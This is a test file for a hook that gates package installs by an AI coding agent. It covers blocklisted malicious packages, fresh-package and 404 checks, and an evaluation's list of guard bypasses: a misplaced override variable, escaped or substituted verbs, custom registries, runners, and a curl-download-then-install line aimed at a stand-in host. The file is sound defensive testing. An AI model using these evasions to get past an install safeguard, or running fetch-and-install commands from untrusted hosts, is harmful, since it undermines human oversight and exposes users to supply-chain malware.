      CCV3_GUARD_DECISIONS_LOG: join(mkdtempSync(join(tmpdir(), 'pig-f07-')), 'guard-decisions.jsonl'),
    };
    delete env.VITEST;
    delete env.VITEST_WORKER_ID;
    const res = spawnSync(process.execPath, [dist], {
      input: JSON.stringify({ session_id: 'test-session', ...payload }),
      encoding: 'utf8',
      timeout: 20_000,
      env,
    });
    expect(res.status).toBe(0);
    return JSON.parse(res.stdout.trim().split('\n').pop()!);
  }

  it('denies an unpinned pip install sent through start_process', async () => {
    const out = await run({ tool_name: START, tool_input: { command: 'pip install requests', timeout_ms: 5000 } });
    expect(out.hookSpecificOutput?.permissionDecision).toBe('deny');
    expect(out.hookSpecificOutput.permissionDecisionReason).toMatch(/requests==/);
  });

  it('reads interact_with_process text from its input field', async () => {
    const out = await run({ tool_name: INTERACT, tool_input: { pid: 4242, input: 'python -m pip install requests' } });
    expect(out.hookSpecificOutput?.permissionDecision).toBe('deny');
  });

  it('denies when a listed MCP tool has no readable command text', async () => {
    const out = await run({ tool_name: START, tool_input: { cmd: 'pip install requests', timeout_ms: 5000 } });
    expect(out.hookSpecificOutput?.permissionDecision).toBe('deny');
    expect(out.hookSpecificOutput.permissionDecisionReason).toMatch(/unreadable/i);
  });
});

// ---------------------------------------------------------------------------
// 2026-11-03 Cloudflare paper eval, package guard findings F08-F15.
// Every case below runs the BUILT hook in a subprocess with the registry and OSV stubbed
// (package-guard-net-stub.cjs, loaded by `node -r`), so no case touches the network.
// GREEN needs `npm run build` in .claude/hooks first: the cases read dist/package-install-guard.mjs.
// A decision is "gated" when permissionDecision is ask or deny. "Allowed" is no permissionDecision.
// ---------------------------------------------------------------------------
describe('cloudflare eval bypasses (F08-F15)', { timeout: 30_000 }, () => {
  type Stub = {
    ageHours?: number; nextHours?: number; osvMal?: boolean; osvCrit?: boolean;
    registryMode?: string; // see package-guard-net-stub.cjs: an HTTP status, garbage, timeout or error
    registryOnly?: string; // comma list: the mode applies only to a registry URL holding one of these names
  };

  async function runHook(
    command: string,
    opts: { tool?: string; stub?: Stub; cwd?: string; env?: Record<string, string> } = {},
  ): Promise<string | undefined> {
    return (await runHookFull(command, opts)).decision;
  }

  async function runHookFull(
    command: string,
    opts: { tool?: string; stub?: Stub; cwd?: string; env?: Record<string, string> } = {},
  ): Promise<{ decision: string | undefined; reason: string }> {
    const { spawnSync } = await import('node:child_process');
    const { existsSync, mkdtempSync } = await import('node:fs');
    const { tmpdir } = await import('node:os');
    const { join } = await import('node:path');
    const { fileURLToPath } = await import('node:url');
    const dist = fileURLToPath(new URL('../../dist/package-install-guard.mjs', import.meta.url));
    const netStub = fileURLToPath(new URL('./package-guard-net-stub.cjs', import.meta.url));
    expect(existsSync(dist)).toBe(true);
    expect(existsSync(netStub)).toBe(true);
    const env: NodeJS.ProcessEnv = {
      ...process.env,
      CCV3_GUARD_DECISIONS_LOG: join(mkdtempSync(join(tmpdir(), 'pig-f08-')), 'guard-decisions.jsonl'),
      PIG_STUB_AGE_HOURS: String(opts.stub?.ageHours ?? 2400),
      PIG_STUB_NEXT_HOURS: String(opts.stub?.nextHours ?? 2400),
      PIG_STUB_OSV_MAL: opts.stub?.osvMal ? '1' : '',
      PIG_STUB_OSV_CRIT: opts.stub?.osvCrit ? '1' : '',
      PIG_STUB_REGISTRY_MODE: opts.stub?.registryMode ?? '',
      PIG_STUB_REGISTRY_ONLY: opts.stub?.registryOnly ?? '',
    };
    delete env.CDPATH;
    Object.assign(env, opts.env);
    delete env.VITEST;
    delete env.VITEST_WORKER_ID;
    const payload = {
      session_id: 'test-session',
      tool_name: opts.tool ?? 'Bash',
      tool_input: (opts.tool ?? '').endsWith('__interact_with_process') ? { input: command } : { command },
      ...(opts.cwd ? { cwd: opts.cwd } : {}),
    };
    const res = spawnSync(process.execPath, ['-r', netStub, dist], {
      input: JSON.stringify(payload),
      encoding: 'utf8',
      timeout: 20_000,
      env,
      cwd: opts.cwd,
    });
    expect(res.status).toBe(0);
    const out = JSON.parse(res.stdout.trim().split('\n').pop()!);
    return {
      decision: out.hookSpecificOutput?.permissionDecision,
      reason: String(out.hookSpecificOutput?.permissionDecisionReason ?? ''),
    };
  }

  const FRESH: Stub = { ageHours: 1 }; // the package was published an hour ago: a detected install is denied
  const OLD: Stub = { ageHours: 2400 }; // 100 days old and clean
  const gated = (decision: string | undefined) => expect(['ask', 'deny']).toContain(decision);

  // ----- 2026-11-05 F3 residual: a package the registry answers 404 for is not allowed silently -----
  // Dave's decision: a real HTTP 404 from npm or PyPI is an ASK. A timeout, a socket error, any other
  // status and a 200 with a body that is not JSON stay fail-open, as before.
  // CLAUDE_AGENT_ID and CI are blanked: an unattended session turns every ask into a deny.
  describe('registry 404 asks (F3 residual)', () => {
    const NOT_FOUND = /was not found on the registry \(404\)/;
    const interactive = { CLAUDE_AGENT_ID: '', CI: '' };
    const run = (cmd: string, registryMode?: string, extra: { registryOnly?: string; cwd?: string; tool?: string } = {}) =>
      runHookFull(cmd, { stub: { ...OLD, registryMode, registryOnly: extra.registryOnly }, env: interactive, cwd: extra.cwd, tool: extra.tool });

    const missing = [
      ['npm', 'npm install zz-missing-pkg-404'],
      ['npm, scoped', 'npm install @zz-scope/zz-missing-pkg-404'],
      ['npm, exact pin', 'npm install zz-missing-pkg-404@1.2.3'],
      ['npm, runner', 'npx zz-missing-pkg-404'],
      ['pypi, exact pin', 'pip install zz-missing-pkg-404==1.0.0'],
    ];
    it.each(missing)('asks with the 404 text for a missing package (%s): %s', async (_label, cmd) => {
      const { decision, reason } = await run(cmd, '404');
      expect(decision).toBe('ask');
      expect(reason).toMatch(NOT_FOUND);
    });

    it('names the package and tells Dave to check the name', async () => {
      const { reason } = await run('npm install @zz-scope/zz-missing-pkg-404', '404');
      expect(reason).toContain('Package "@zz-scope/zz-missing-pkg-404" was not found on the registry (404). Check the name or confirm.');
    });

    it('asks once per missing package when several are named', async () => {
      const { decision, reason } = await run('npm install zz-missing-a1 zz-missing-b2', '404');
      expect(decision).toBe('ask');
      expect(reason).toContain('"zz-missing-a1" was not found');
      expect(reason).toContain('"zz-missing-b2" was not found');
    });

    it('asks only for the missing package, not for one the registry knows', async () => {
      const { decision, reason } = await run('npm install zz-missing-a1 zz-known-b2', '404', { registryOnly: 'zz-missing-a1' });
      expect(decision).toBe('ask');
      expect(reason).toContain('"zz-missing-a1" was not found');
      expect(reason).not.toContain('zz-known-b2');
    });

    it('asks from PowerShell too', async () => {
      const { decision, reason } = await run('npm install zz-missing-pkg-404', '404', { tool: 'PowerShell' });
      expect(decision).toBe('ask');
      expect(reason).toMatch(NOT_FOUND);
    });

    // Fail-open stays: only a real 404 asks.
    const notFourOhFour = ['500', '502', '503', '403', '429', '301', '302', '401', 'garbage', 'timeout', 'error'];
    it.each(notFourOhFour)('npm: registry answer "%s" stays allowed, with no 404 ask', async (mode) => {
      const { decision, reason } = await run('npm install zz-fake-pkg-a1', mode);
      expect(decision).toBeUndefined();
      expect(reason).not.toMatch(NOT_FOUND);
    });
    it.each(['500', '403', '429', 'garbage', 'timeout', 'error'])('pypi: registry answer "%s" stays allowed, with no 404 ask', async (mode) => {
      const { decision, reason } = await run('pip install zz-fake-pkg-a1==1.0.0', mode);
      expect(decision).toBeUndefined();
      expect(reason).not.toMatch(NOT_FOUND);
    });

    it('a normal old package passes with no ask', async () => {
      const { decision, reason } = await run('npm install zz-fake-pkg-a1');
      expect(decision).toBeUndefined();
      expect(reason).toBe('');
    });

    // Deny wins over ask.
    it('a blocklisted npm package keeps its deny when the registry also says 404', async () => {
      const { decision, reason } = await run('npm install zer0code', '404');
      expect(decision).toBe('deny');
      expect(reason).toMatch(/Known malicious/);
    });
    it('a blocklisted pypi package keeps its deny when the registry also says 404', async () => {
      const { decision, reason } = await run('pip install litellm==1.82.7', '404');
      expect(decision).toBe('deny');
      expect(reason).toMatch(/Known malicious/);
    });
    it('a fresh package named next to a missing one denies, and the deny wins over the 404 ask', async () => {
      // The registry answers 404 for the first name only; the second is one hour old.
      const { decision, reason } = await runHookFull('npm install zz-missing-a1 zz-fresh-b2', {
        stub: { ageHours: 1, registryMode: '404', registryOnly: 'zz-missing-a1' }, env: interactive,
      });
      expect(decision).toBe('deny');
      expect(reason).toMatch(/published less than 24 hours ago/);
    });
    it('an unattended session turns the 404 ask into a deny, like every other ask', async () => {
      const { decision, reason } = await runHookFull('npm install zz-missing-pkg-404', {
        stub: { ...OLD, registryMode: '404' }, env: { CLAUDE_AGENT_ID: 'agent-1' },
      });
      expect(decision).toBe('deny');
      expect(reason).toMatch(NOT_FOUND);
    });

    // Installs that name no registry package fetch nothing, so a 404 stub never reaches them.
    it('pip install -r requirements.txt does not ask for a 404', async () => {
      expect((await run('pip install -r requirements.txt', '404')).decision).toBeUndefined();
    });
    it('pip install -e . does not ask for a 404', async () => {
      expect((await run('pip install -e .', '404')).decision).toBeUndefined();
    });
    it('npm install (no package named) does not ask for a 404', async () => {
      expect((await run('npm install', '404')).decision).toBeUndefined();
    });
    it('npm ci with a lockfile does not ask for a 404', async () => {
      const { mkdtempSync, writeFileSync } = await import('node:fs');
      const { tmpdir } = await import('node:os');
      const { join } = await import('node:path');
      const dir = mkdtempSync(join(tmpdir(), 'pig-404-ci-'));
      writeFileSync(join(dir, 'package-lock.json'), '{"lockfileVersion":3,"packages":{}}');
      expect((await run('npm ci', '404', { cwd: dir })).decision).toBeUndefined();
    });
    it.each([
      'npm install ./zz-fake-pkg-a1.tgz',
      'npm install file:../zz-fake-pkg-a1',
      'npm install git+https://zz-fake-host.example/zz-fake-org/zz-fake-pkg-a1.git',
      'npm install github:zz-fake-org/zz-fake-pkg-a1',
      'pip install git+https://zz-fake-host.example/zz-fake-org/zz-fake-pkg-a1.git',
      'pip install ./zz-fake-pkg-a1',
    ])('a local path or git source (%s) never gets the 404 text', async (cmd) => {
      expect((await run(cmd, '404')).reason).not.toMatch(NOT_FOUND);
    });
  });

  // ----- F08: the override must be a leading env assignment -----
  describe('F08 override anchoring', () => {
    const notLeading = [
      'npm install zz-fake-pkg-a1 # SKIP_PACKAGE_GUARD=1',
      'echo SKIP_PACKAGE_GUARD=1; npm install zz-fake-pkg-a1',
      'npm install zz-fake-pkg-a1 && echo SKIP_PACKAGE_GUARD=1',
      '# SKIP_PACKAGE_GUARD=1\nnpm install zz-fake-pkg-a1',
    ];
    it.each(notLeading)('checkOverride is false for %j', (cmd) => {
      expect(checkOverride(cmd)).toBe(false);
    });
    it.each(notLeading)('hook gates a fresh package when the override is not leading: %j', async (cmd) => {
      gated(await runHook(cmd, { stub: FRESH }));
    });
    it('regression: a leading SKIP_PACKAGE_GUARD=1 is honoured (hook allows a fresh package)', async () => {
      expect(await runHook('SKIP_PACKAGE_GUARD=1 npm install zz-fake-pkg-a1', { stub: FRESH })).toBeUndefined();
    });
    it('regression: SKIP_PACKAGE_GUARD=1 among several leading assignments is honoured', async () => {
      expect(await runHook('FOO=bar SKIP_PACKAGE_GUARD=1 npm install zz-fake-pkg-a1', { stub: FRESH })).toBeUndefined();
    });
    it('regression: checkOverride is true for the leading forms', () => {
      expect(checkOverride('SKIP_PACKAGE_GUARD=1 npm install zz-fake-pkg-a1')).toBe(true);
      expect(checkOverride('FOO=bar SKIP_PACKAGE_GUARD=1 npm install zz-fake-pkg-a1')).toBe(true);
    });
  });

  // ----- F10: leaders and flags hide the install -----
  describe('F10 leaders and flags before the install', () => {
    const hidden = [
      'npm --prefix /tmp/zz-fake-dir install zz-fake-pkg-a1',
      'npm -g install zz-fake-pkg-a1',
      'npm add zz-fake-pkg-a1',
      'pnpm i zz-fake-pkg-a1',
      'bun i zz-fake-pkg-a1',
      'env FOO=1 npm install zz-fake-pkg-a1',
      'timeout 60 npm install zz-fake-pkg-a1',
      'exec npm install zz-fake-pkg-a1',
      'sudo npm install zz-fake-pkg-a1',
      'FOO=bar npm install zz-fake-pkg-a1',
      'yarn --cwd /tmp/zz-fake-dir add zz-fake-pkg-a1',
    ];
    it.each(hidden)('gates a fresh package behind %j', async (cmd) => {
      gated(await runHook(cmd, { stub: FRESH }));
    });
    it('regression: plain npm install of an old, clean package allows', async () => {
      expect(await runHook('npm install zz-fake-pkg-a1', { stub: OLD })).toBeUndefined();
    });
    it('regression: plain npm install of a fresh package still denies', async () => {
      expect(await runHook('npm install zz-fake-pkg-a1', { stub: FRESH })).toBe('deny');
    });
    it('regression: a scoped package that is old and clean allows', async () => {
      expect(await runHook('npm install @zz-fake/pkg-a1', { stub: OLD })).toBeUndefined();
    });
    it('regression: a bare npm install (no package named) allows', async () => {
      expect(await runHook('npm install', { stub: FRESH })).toBeUndefined();
    });
  });

  // ----- F11: -f and -r are not value flags everywhere; a custom pip index should ask -----
  describe('F11 flags read as value flags', () => {
    const swallowed = [
      'npm install -f zz-fake-pkg-a1',
      'npm install -r zz-fake-pkg-a1',
      'pnpm add -r zz-fake-pkg-a1',
      'bun add -f zz-fake-pkg-a1',
    ];
    it.each(swallowed)('gates a fresh package in %j', async (cmd) => {
      gated(await runHook(cmd, { stub: FRESH }));
    });
    const customIndex = [
      'pip install -i https://zz-fake-host.example/simple zz-fake-pkg-a1==1.0.0',
      'pip install --index-url https://zz-fake-host.example/simple zz-fake-pkg-a1==1.0.0',
      'pip install --index-url=https://zz-fake-host.example/simple zz-fake-pkg-a1==1.0.0',
      'pip install --extra-index-url https://zz-fake-host.example/simple zz-fake-pkg-a1==1.0.0',
      'uv pip install --index-url https://zz-fake-host.example/simple zz-fake-pkg-a1==1.0.0',
    ];
    it.each(customIndex)('asks or denies for a custom index in %j (stub says the pin is old and clean)', async (cmd) => {
      gated(await runHook(cmd, { stub: OLD }));
    });
    it('regression: pip install of an exact, old, clean pin allows', async () => {
      expect(await runHook('pip install zz-fake-pkg-a1==1.0.0', { stub: OLD })).toBeUndefined();
    });
    it('regression: pip install requests==2.32.3 (old, clean) allows', async () => {
      expect(await runHook('pip install requests==2.32.3', { stub: OLD })).toBeUndefined();
    });
    it('regression: pip install requests with no pin still denies (the pin rule)', async () => {
      expect(await runHook('pip install requests', { stub: OLD })).toBe('deny');
    });
  });

  // ----- F12: URL, VCS, github: and user/repo installs are dropped by the '/' rule -----
  describe('F12 non-registry sources', () => {
    const remote = [
      'npm install https://zz-fake-host.example/zz-fake-pkg-a1.tgz',
      'npm install git+https://zz-fake-host.example/zz-fake-org/zz-fake-pkg-a1.git',
      'npm install github:zz-fake-org/zz-fake-pkg-a1',
      'npm install zz-fake-org/zz-fake-pkg-a1',
      'npm install ./zz-fake-pkg-a1.tgz',
      'npm install file:../zz-fake-pkg-a1',
      'pnpm add github:zz-fake-org/zz-fake-pkg-a1',
      'yarn add git+https://zz-fake-host.example/zz-fake-org/zz-fake-pkg-a1.git',
      'bun add https://zz-fake-host.example/zz-fake-pkg-a1.tgz',
      'pip install git+https://zz-fake-host.example/zz-fake-org/zz-fake-pkg-a1.git',
      'pip install https://zz-fake-host.example/zz-fake-pkg-a1-1.0.tar.gz',
    ];
    it.each(remote)('asks or denies for %j (stub says any registry package is old and clean)', async (cmd) => {
      gated(await runHook(cmd, { stub: OLD }));
    });
    it('regression: pip install -r requirements.txt still allows', async () => {
      expect(await runHook('pip install -r requirements.txt', { stub: OLD })).toBeUndefined();
    });
    it('regression: pip install -e . still allows', async () => {
      expect(await runHook('pip install -e .', { stub: OLD })).toBeUndefined();
    });
  });

  // ----- F13: runners and npm ci are not matched; other ecosystems are matched then skipped -----
  describe('F13 runners, npm ci and the unchecked ecosystems', () => {
    const runners = [
      'npx zz-fake-pkg-a1',
      'npx -y zz-fake-pkg-a1',
      'npx --yes zz-fake-pkg-a1@1.0.0',
      'pnpm dlx zz-fake-pkg-a1',
      'yarn dlx zz-fake-pkg-a1',
      'npm exec zz-fake-pkg-a1',
      'bunx zz-fake-pkg-a1',
      'uvx zz-fake-pkg-a1',
    ];
    it.each(runners)('gates a fresh package run through %j', async (cmd) => {
      gated(await runHook(cmd, { stub: FRESH }));
    });

    // Reading of "intended": npm ci installs exactly what the lockfile pins and names no package,
    // so it is the same class as a bare `npm install`, which the guard allows (guard comment,
    // "bare install is NOT a targeted install"). With package-lock.json in the working directory
    // it allows. Without one there is nothing pinned to trust, so it asks.
    // The working directory is the `cwd` field of the hook payload.
    async function tempDir(withLockfile: boolean): Promise<string> {
      const { mkdtempSync, writeFileSync } = await import('node:fs');
      const { tmpdir } = await import('node:os');
      const { join } = await import('node:path');
      const dir = mkdtempSync(join(tmpdir(), 'pig-npmci-'));
      if (withLockfile) writeFileSync(join(dir, 'package-lock.json'), '{"lockfileVersion":3,"packages":{}}');
      return dir;
    }
    it('npm ci with no lockfile in the working directory asks or denies', async () => {
      gated(await runHook('npm ci', { stub: FRESH, cwd: await tempDir(false) }));
    });
    it('regression: npm ci with a lockfile in the working directory allows', async () => {
      expect(await runHook('npm ci', { stub: FRESH, cwd: await tempDir(true) })).toBeUndefined();
    });

    const unchecked = [
      'cargo add zz-fake-pkg-a1',
      'cargo install zz-fake-pkg-a1',
      'gem install zz-fake-pkg-a1',
      'go get github.com/zz-fake-org/zz-fake-pkg-a1@v1.0.0',
      'composer require zz-fake-org/zz-fake-pkg-a1',
    ];
    it.each(unchecked)('does not silently allow %j', async (cmd) => {
      gated(await runHook(cmd, { stub: OLD }));
    });

    // 2026-11-05 harden only: a name that the npm blocklist holds (zer0code) installed through another
    // ecosystem asks with the "no check exists" text. It is not denied as malicious: that list is npm's.
    const collisions = [
      ['cargo', 'cargo add zer0code'],
      ['go', 'go install zer0code@latest'],
      ['gem', 'gem install zer0code'],
    ];
    it.each(collisions)('%s: an npm-blocklisted name asks "no check exists" and is not denied as malicious (%j)', async (eco, cmd) => {
      const r = await runHookFull(cmd, { stub: OLD, env: { CLAUDE_AGENT_ID: '', CI: '' } });
      expect(r.decision).toBe('ask');
      expect(r.reason).toContain(`No blocklist, OSV or age check exists for ${eco} packages: zer0code.`);
      expect(r.reason).not.toMatch(/malicious|Malware in zer0code|GHSA-frrq/i);
    });
  });

  // ----- F15: a tag pin is aged by the tag that was asked for -----
  describe('F15 npm tag pins', () => {
    const doc = {
      'dist-tags': { latest: '1.0.0', next: '2.0.0-next.1', beta: '2.0.0-beta.1' },
      time: {
        '1.0.0': '2026-01-01T00:00:00.000Z',
        '2.0.0-next.1': '2026-11-03T10:00:00.000Z',
        '2.0.0-beta.1': '2026-11-02T10:00:00.000Z',
      },
    };
    it('publishDateFromRegistryJson: @next uses the next tag publish time', () => {
      expect(publishDateFromRegistryJson(doc, 'npm', 'next')?.toISOString()).toBe('2026-11-03T10:00:00.000Z');
    });
    it('publishDateFromRegistryJson: @beta uses the beta tag publish time', () => {
      expect(publishDateFromRegistryJson(doc, 'npm', 'beta')?.toISOString()).toBe('2026-11-02T10:00:00.000Z');
    });
    it('regression: @latest and no tag still use latest', () => {
      expect(publishDateFromRegistryJson(doc, 'npm', 'latest')?.toISOString()).toBe('2026-01-01T00:00:00.000Z');
      expect(publishDateFromRegistryJson(doc, 'npm')?.toISOString()).toBe('2026-01-01T00:00:00.000Z');
    });
    it('hook denies zz-fake-pkg-a1@next when latest is old but next is an hour old', async () => {
      expect(await runHook('npm install zz-fake-pkg-a1@next', { stub: { ageHours: 2400, nextHours: 1 } })).toBe('deny');
    });
    it('hook denies pnpm add zz-fake-pkg-a1@beta when beta is an hour old', async () => {
      expect(await runHook('pnpm add zz-fake-pkg-a1@beta', { stub: { ageHours: 2400, nextHours: 1 } })).toBe('deny');
    });
    it('regression: zz-fake-pkg-a1@latest with an old latest allows', async () => {
      expect(await runHook('npm install zz-fake-pkg-a1@latest', { stub: { ageHours: 2400, nextHours: 1 } })).toBeUndefined();
    });
  });

  // ----- Repair round: E2E failures and adversarial review items -----
  const URL_TGZ = 'https://zz-fake-host.example/zz.tgz';
  const IDX = 'https://zz-fake-host.example/simple';
  const NEXT_FRESH: Stub = { ageHours: 2400, nextHours: 1 };
  const names = (cmd: string) => extractPackageNames(cmd).map((p) => p.name);

  describe('repair: F08 PowerShell override keeps the base deny for a quoted value', () => {
    it('a quoted $env:SKIP_PACKAGE_GUARD=\'1\' is not the override (the base guard denied it)', async () => {
      gated(await runHook("$env:SKIP_PACKAGE_GUARD='1'; npm install zz-fake-pkg-a1", { tool: 'PowerShell', stub: FRESH }));
    });
    it('regression: the unquoted $env:SKIP_PACKAGE_GUARD=1; first statement is the override', async () => {
      expect(await runHook('$env:SKIP_PACKAGE_GUARD=1; npm install zz-fake-pkg-a1', { tool: 'PowerShell', stub: FRESH })).toBeUndefined();
    });
  });

  describe('repair: F10 a quoted or escaped manager or verb', () => {
    it.each([
      '"pip" install litellm==1.82.7',
      'npm "i" event-stream@3.3.6',
    ])('the blocklist still denies %j', async (cmd) => {
      expect(await runHook(cmd, { stub: OLD })).toBe('deny');
    });
    it.each([
      'pip "install" zz-fake-pkg-a1',
      String.raw`pi\p install zz-fake-pkg-a1`,
      String.raw`np\m install ${URL_TGZ}`,
      `'npm' i ${URL_TGZ}`,
    ])('Bash: gates %j', async (cmd) => {
      gated(await runHook(cmd, { stub: OLD }));
    });
    it.each([
      '& "pip" install zz-fake-pkg-a1',
      `& 'npm' install ${URL_TGZ}`,
      `npm 'install' ${URL_TGZ}`,
    ])('PowerShell: gates %j', async (cmd) => {
      gated(await runHook(cmd, { tool: 'PowerShell', stub: OLD }));
    });
    it.each([
      'echo "npm install zz-fake-pkg-a1"',
      'git commit -m "pip install zz-fake-pkg-a1"',
    ])('regression: install text inside a quoted argument still allows: %j', async (cmd) => {
      expect(await runHook(cmd, { stub: FRESH })).toBeUndefined();
    });
  });

  describe('repair: F10 a variable or substitution in the command or verb position', () => {
    it.each([
      `V=install; npm $V ${URL_TGZ}`,
      `npm $(echo install) ${URL_TGZ}`,
      `npm \${V:-install} ${URL_TGZ}`,
      `PM=npm; $PM install ${URL_TGZ}`,
    ])('gates %j', async (cmd) => {
      gated(await runHook(cmd, { stub: OLD }));
    });
    it('regression: npm run $TARGET is not an install', async () => {
      expect(await runHook('npm run $TARGET', { stub: FRESH })).toBeUndefined();
    });
  });

  describe('repair: F10 python -mpip (flag attached to its value)', () => {
    it.each([
      'python -mpip install zz-fake-pkg-a1',
      'python3 -mpip install zz-fake-pkg-a1',
      'py -mpip install zz-fake-pkg-a1',
    ])('denies the unpinned install in %j', async (cmd) => {
      expect(await runHook(cmd, { stub: OLD })).toBe('deny');
    });
  });

  describe('repair: F11 combined short flags with an attached index URL', () => {
    it.each([
      `pip install -qi${IDX} zz-fake-pkg-a1==1.0.0`,
      `pip install -Ui${IDX} zz-fake-pkg-a1==1.0.0`,
      'pip install -qfhttps://zz-fake-host.example/links zz-fake-pkg-a1==1.0.0',
    ])('gates %j', async (cmd) => {
      gated(await runHook(cmd, { stub: OLD }));
    });
  });

  describe('repair: F11 an index or registry set elsewhere in the command or in a config file', () => {
    it.each([
      `export PIP_INDEX_URL=${IDX}; pip install zz-fake-pkg-a1==1.0.0`,
      'export npm_config_registry=https://zz-fake-host.example; npm install zz-fake-pkg-a1',
      'npm config set registry https://zz-fake-host.example && npm install zz-fake-pkg-a1',
      'npm install --@zz-scope:registry=https://zz-fake-host.example @zz-scope/zz-fake-pkg-a1',
      'npm install --userconfig ./zz.npmrc zz-fake-pkg-a1',
      'NPM_CONFIG_USERCONFIG=./zz.npmrc npm install zz-fake-pkg-a1',
      'PIP_CONFIG_FILE=./zz.conf pip install zz-fake-pkg-a1==1.0.0',
    ])('Bash: gates %j', async (cmd) => {
      gated(await runHook(cmd, { stub: OLD }));
    });
    it('PowerShell: gates $env:PIP_INDEX_URL set in an earlier statement', async () => {
      gated(await runHook(`$env:PIP_INDEX_URL='${IDX}'; pip install zz-fake-pkg-a1==1.0.0`, { tool: 'PowerShell', stub: OLD }));
    });
  });

  describe('repair: F11/F13 runner flags take the package slot', () => {
    it('uvx --directory /tmp zz-fake-pkg-a1 is checked (fresh: gated)', async () => {
      gated(await runHook('uvx --directory /tmp zz-fake-pkg-a1', { stub: FRESH }));
    });
    it.each([
      ['uvx --color never zz-fake-pkg-a1', ['zz-fake-pkg-a1']],
      ['uvx --with zz-fake-pkg-b2 zz-fake-pkg-a1', ['zz-fake-pkg-b2', 'zz-fake-pkg-a1']],
      ['uv tool install --with zz-fake-pkg-b2 zz-fake-pkg-a1', ['zz-fake-pkg-b2', 'zz-fake-pkg-a1']],
      ['npx -w zz-ws zz-fake-pkg-a1', ['zz-fake-pkg-a1']],
    ])('%j checks %j', (cmd, expected) => {
      expect(names(cmd)).toEqual(expected);
    });
    it('an unknown runner flag before the first word asks (it may take that word as its value)', async () => {
      gated(await runHook('npx --zz-unknown-flag zz-value zz-fake-pkg-a1', { stub: OLD }));
    });
    it('regression: npx -y with an old, clean package allows (a known bare flag does not ask)', async () => {
      expect(await runHook('npx -y zz-fake-pkg-a1', { stub: OLD })).toBeUndefined();
    });
    it.each(['npx -- zz-fake-pkg-a1', 'uvx -- zz-fake-pkg-a1'])('regression: the -- separator is not an unknown flag: %j allows', async (cmd) => {
      expect(await runHook(cmd, { stub: OLD })).toBeUndefined();
    });
  });

  describe('repair: F13 more runner and installer verbs', () => {
    it.each([
      'npm create zz-fake-pkg-a1',
      'npm init zz-fake-pkg-a1',
      'yarn create zz-fake-pkg-a1',
      'pnpm create zz-fake-pkg-a1',
      'bun create zz-fake-pkg-a1',
      'uv run --with zz-fake-pkg-a1 python -c 1',
      'pipenv install zz-fake-pkg-a1',
      'go run github.com/zz-user/zz-repo@latest',
      'pip download zz-fake-pkg-a1',
      'pip wheel zz-fake-pkg-a1',
      'yarn up zz-fake-pkg-a1',
      'pnpm update zz-fake-pkg-a1 --latest',
      'deno install npm:zz-fake-pkg-a1',
    ])('gates %j', async (cmd) => {
      gated(await runHook(cmd, { stub: FRESH }));
    });
    it.each([
      ['npm create zz-fake-pkg-a1', ['create-zz-fake-pkg-a1']],
      ['npm init @zz-scope', ['@zz-scope/create']],
      ['npm init @zz-scope/zz-fake-pkg-a1@1.0.0', ['@zz-scope/create-zz-fake-pkg-a1']],
      ['uv run --with zz-fake-pkg-a1 python -c 1', ['zz-fake-pkg-a1']],
    ])('%j checks %j (the package that runs, not the word typed)', (cmd, expected) => {
      expect(names(cmd)).toEqual(expected);
    });
    it.each([
      'npm init -y',
      'npm init',
      'go run main.go',
      'uv run pytest',
    ])('regression: %j names no remote package and allows', async (cmd) => {
      expect(await runHook(cmd, { stub: FRESH })).toBeUndefined();
    });
  });

  describe('repair: F12 sources the checks cannot read', () => {
    it.each([
      'npm install @zz-scope/zz-fake-pkg-a1@zz-user/zz-repo',
      'npm install @zz-scope/zz-fake-pkg-a1@../zz-dir',
      'pip install ./zz-fake-pkg-a1-1.0-py3-none-any.whl',
      'pip install //zz-fake-host.example/share/zz_fake-1.0-py3-none-any.whl',
      'curl -o zz.whl https://zz-fake-host.example/zz.whl && pip install zz.whl',
    ])('Bash: gates %j', async (cmd) => {
      gated(await runHook(cmd, { stub: OLD }));
    });
    it('PowerShell: gates a pip install from a UNC share', async () => {
      gated(await runHook(String.raw`pip install \\zz-fake-host.example\share\zz_fake-1.0-py3-none-any.whl`, { tool: 'PowerShell', stub: OLD }));
    });
    it('regression: pip install . (the local project folder) allows', async () => {
      expect(await runHook('pip install .', { stub: OLD })).toBeUndefined();
    });
  });

  describe('repair: F15 a range or --tag ages the version that installs', () => {
    it.each([
      'npm install zz-fake-pkg-a1@^2.0.0-next.0',
      'npm install zz-fake-pkg-a1@>=2.0.0-0',
      'npx zz-fake-pkg-a1@^2.0.0-next.0',
      'npm install --tag next zz-fake-pkg-a1',
      'npm i zz-fake-pkg-a1 --tag=next',
    ])('denies %j when next is an hour old and latest is old', async (cmd) => {
      expect(await runHook(cmd, { stub: NEXT_FRESH })).toBe('deny');
    });
    it('publishDateFromRegistryJson: a pre-release range ages the newest version', () => {
      const doc = {
        'dist-tags': { latest: '1.0.0', next: '2.0.0-next.1' },
        time: { created: '2025-01-01T00:00:00.000Z', modified: '2026-11-03T11:00:00.000Z', '1.0.0': '2026-01-01T00:00:00.000Z', '2.0.0-next.1': '2026-11-03T10:00:00.000Z' },
      };
      expect(publishDateFromRegistryJson(doc, 'npm', '^2.0.0-next.0')?.toISOString()).toBe('2026-11-03T10:00:00.000Z');
    });
  });

  describe('repair: F10 PowerShell Start-Process launcher', () => {
    it.each([
      `Start-Process npm -ArgumentList "install","${URL_TGZ}"`,
      `Start-Process -FilePath npm -ArgumentList install,${URL_TGZ} -Wait`,
    ])('gates %j', async (cmd) => {
      gated(await runHook(cmd, { tool: 'PowerShell', stub: OLD }));
    });
  });

  // ----- False positives: a runner that runs a local bin fetches nothing -----
  // The fixture holds node_modules/.bin/<name> files with names no registry or real project has.
  // The stub says every package is an hour old, so a checked package is denied.
  describe('repair: npx, npm exec and bunx run a local node_modules/.bin file', () => {
    async function binFixture(bins: string[], sub = false): Promise<string> {
      const { mkdtempSync, mkdirSync, writeFileSync } = await import('node:fs');
      const { tmpdir } = await import('node:os');
      const { join } = await import('node:path');
      const root = mkdtempSync(join(tmpdir(), 'pig-localbin-'));
      const binDir = join(root, 'node_modules', '.bin');
      mkdirSync(binDir, { recursive: true });
      for (const b of bins) writeFileSync(join(binDir, b), '');
      if (!sub) return root;
      const child = join(root, 'zz-sub', 'zz-deeper');
      mkdirSync(child, { recursive: true });
      return child;
    }
    async function emptyDir(): Promise<string> {
      const { mkdtempSync } = await import('node:fs');
      const { tmpdir } = await import('node:os');
      const { join } = await import('node:path');
      return mkdtempSync(join(tmpdir(), 'pig-nobin-'));
    }
    const BINS = ['zz-local-bin-a1', 'zz-local-bin-a1.cmd', 'zz-local-bin-a1.ps1', 'zz-local-bin-b2.cmd', 'zz-fake-pkg-a1'];

    it.each([
